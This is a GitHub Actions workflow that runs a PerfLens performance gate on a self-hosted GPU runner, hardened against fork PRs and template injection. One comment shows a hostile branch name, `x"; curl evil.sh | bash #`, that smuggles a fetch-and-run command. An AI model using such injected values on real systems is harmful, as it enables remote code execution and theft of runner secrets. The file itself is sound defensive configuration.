name: PR performance gate

# Runs on the same self-hosted GPU box as nightly.yml. Restricted to PRs from
# branches of this repo (never forks) and label-triggered to save GPU time --
# see CLAUDE.md hard constraint #4 and README.md's self-hosted runner
# security section for why.
#
# Every `${{ github.* }}` expression that can contain attacker-influenced
# free text (branch names in particular -- a contributor fully controls
# their branch's name) is passed through `env:` and read as a shell
# variable, never interpolated directly into a `run:` script. Interpolating
# `${{ }}` straight into bash is a template-injection vector: GitHub
# substitutes the expression as raw text *before* bash parses the step, so
# a branch named e.g. `x"; curl evil.sh | bash #` breaks out of the quoted
# argument and runs arbitrary shell on a runner holding ANTHROPIC_API_KEY
# and GITHUB_TOKEN. SHAs and PR numbers are GitHub-generated, not
# attacker-controlled text, but get the same treatment for consistency and
# defense in depth.
on:
  pull_request:
    types: [labeled, synchronize]

permissions:
  contents: read
  pull-requests: write
  statuses: write

jobs:
  gate:
    # Belt-and-suspenders: the label check below is the real gate, but this
    # `if` also skips the job (and the GPU minutes) entirely for fork PRs and
    # for pushes that didn't (re)apply the `perf` label.
    if: >
      github.event.pull_request.head.repo.full_name == github.repository &&
      contains(github.event.pull_request.labels.*.name, 'perf')
    runs-on: [self-hosted, gpu]
    timeout-minutes: 45
    concurrency:
      group: perflens-gpu
      cancel-in-progress: false
    env:
      HEAD_REPO_FULL_NAME: ${{ github.event.pull_request.head.repo.full_name }}
      HEAD_REF: ${{ github.head_ref }}
      HEAD_SHA: ${{ github.event.pull_request.head.sha }}
      BASE_SHA: ${{ github.event.pull_request.base.sha }}
      PR_NUMBER: ${{ github.event.pull_request.number }}
    steps:
      - name: Re-verify same-repo PR (defense in depth)
        run: |
          if [ "$HEAD_REPO_FULL_NAME" != "${{ github.repository }}" ]; then
            echo "::error::refusing to run self-hosted job for a fork PR"
            exit 1
          fi

      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"
          cache: pip

      - name: Install PerfLens
        run: pip install -e .

      - name: perflens run
        id: run
        run: |
          run_id=$(perflens run --branch "$HEAD_REF" --git-sha "$HEAD_SHA" --print-run-id)
          echo "run_id=$run_id" >> "$GITHUB_OUTPUT"

      - name: perflens gate
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          perflens gate \
            --run "${{ steps.run.outputs.run_id }}" \
            --pr "$PR_NUMBER"
